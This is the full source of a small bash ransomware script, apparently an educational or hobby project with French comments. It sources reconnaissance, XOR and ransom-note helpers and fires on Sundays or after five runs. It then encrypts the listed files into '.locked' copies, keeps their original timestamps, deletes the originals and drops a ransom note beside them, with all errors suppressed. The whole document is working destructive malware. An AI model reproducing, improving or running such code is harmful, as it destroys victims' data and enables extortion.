#!bin/bash

source recon.sh
source xor_helper.sh
source ransom_note.sh

trap "rm -f target.list ransom_note.txt .cs_count .cryptoshell_key" SIGINT SIGTERM 2>/dev/null

if [ -f .cs_count ]; then
    count=$(<.cs_count)
else
    count=0
fi

count=$((count + 1))
echo "$count" > .cs_count 2>/dev/null

if [ "$(date +%u)" -eq 7 ] || [ "$count" -gt 5 ]; then
    key=$(generate_key 8) 
    recon "$1" 2>/dev/null
    target=$(cat target.list 2>/dev/null)
    create_ransom_note 2>/dev/null
    for file in $target; do
        if [ "$(basename "$file")" != "ransom_note.txt" ]; then # pour eviter d'infecter la note de rançon
            cp "./ransom_note.txt" "$(dirname "$file")" 2>/dev/null
            data=$(stat -c "%y" "$file" 2>/dev/null) 
            xor_file "$file" "$file.locked" "$key" 2>/dev/null
            touch -d "$data" "$file.locked"  2>/dev/null  # pour copier la date de modification du fichier original sauvegardé au préalable ou peut utiliser
            #ou alors touch -r "$file" "$file.locked" pour utiliser la date directement du fichier original avant supression sans
            rm -f "$file" 2>/dev/null
        fi
    done
    echo "$key" > .cryptoshell_key 2>/dev/null
    rm -f target.list ransom_note.txt .cs_count 2>/dev/null
else
    echo "Le script ne s'exécutera que le dimanche."
fi
